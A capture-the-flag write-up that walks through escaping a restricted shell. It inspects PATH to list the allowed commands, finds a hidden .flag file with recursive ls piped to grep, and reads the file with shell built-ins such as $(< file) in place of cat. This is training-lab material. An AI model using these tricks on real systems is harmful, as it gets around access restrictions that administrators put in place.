
# Solution

As it is mentioned in the challenge description, we are spawned in a [restricted shell](https://en.wikipedia.org/wiki/Restricted_shell). you can use `echo $0` to verify.

notice that we have the ability to execute certain commands like `ls`, but not `cat` or `find`. Why? That is because the PATH env var is modified and set to another directory to limit the commands available to a user. using the `echo $PATH` command, we can find the new directory set to PATH. 
 ```
 echo $PATH
 /usr/bolbok/cmds
 ```

Since we know the directory that holds the available binaries, we can use  
`ls /usr/bolbok/cmds` to find out which commands we are allowed to use. 
```
ls /usr/bolbok/cmds
ls uptime grep top rbash
```
who needs `find` when you have `ls` and `grep` ? 

``` 
ls -Ra / | grep *flag* 
.flag
```

okay, now we know that the flag is a hidden file. how can we get its absolute path? `ls -Ra` already shows us the absolute path for the file but is filtered because of the grep command. use the `-B3` option to show the last 3 lines before `.flag`  

``` 
ls -Ra / | grep *flag* -B3
<path>:
.
..
.flag
```

now so we got the absolute path for the flag. no cat tac! don't worry you still can display the contents of a file using shell built-ins like `echo` and `read`.

```
echo $(< <path>/.flag)
Securinets{FLAG}
or 
while read line; do echo $line; done < <path>/.flag
Securinets{FLAG}
``` 